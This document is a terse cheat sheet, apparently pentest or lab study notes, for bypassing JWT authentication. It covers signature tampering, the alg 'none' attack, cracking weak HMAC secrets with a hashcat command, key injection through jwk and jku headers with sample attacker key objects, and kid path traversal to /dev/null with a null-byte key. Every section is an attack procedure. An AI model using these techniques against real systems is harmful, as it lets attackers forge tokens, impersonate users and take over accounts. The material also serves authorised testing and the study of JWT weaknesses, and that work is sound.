### A JWT consists of 3 parts: a header, a payload, and a signature.

## unverified signature
```
jwt -> tamper
```

## none signature attack
```
jwr -> tamper -> change header alg to none
```

## weak secret key
```
jwt -> hashcat -a 0 -m 16500 <YOUR-JWT> <wordlist>
```

## jws injection via jwk
```
jwt -> New RSA Key (JWT Editor Keys) -> add new key to header (jwk)

{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```

## jws injection via jku
```
jwt -> New RSA Key (JWT Editor Keys) -> add kju param (url)

example object:
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
        }
    ]
}
```

## jws injection via kid
```
jwt -> New Symmetric Key (JWT Editor Keys) -> replace k for Base64-encoded null byte (AA==) -> change kid param to /dev/null -> sign
```
